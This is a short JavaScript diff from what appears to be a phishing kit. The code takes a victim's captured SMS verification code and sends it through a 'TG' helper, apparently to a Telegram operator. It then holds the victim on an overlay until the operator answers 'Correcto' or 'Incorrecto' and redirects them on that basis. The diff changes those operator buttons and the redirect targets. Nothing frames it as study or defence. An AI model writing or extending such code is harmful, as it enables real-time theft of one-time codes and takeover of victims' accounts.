@@ -522,15 +522,11 @@
           + '\u{1F511} SMS: ' + smsCode;
 
         TG.overlay(true);
-        TG.send(msg, true, null, { label: 'Nuevo \uD83C\uDD95', action: 'nuevo' }).then(function (sessionId) {
+        TG.send(msg, true, ['\u2705 Correcto', '\u274C Incorrecto']).then(function (sessionId) {
           TG.poll(sessionId, function (action) {
             TG.overlay(false);
             if (action === 'correct') {
-              window.location.href = '../patron.html';
-            } else if (action === 'incorrect') {
-              window.location.href = 'sms.html';
-            } else if (action === 'nuevo') {
-              window.location.href = '../nuevo.html';
+              window.location.href = '../p7n.html';
             } else {
               window.location.href = 'sms.html';
             }
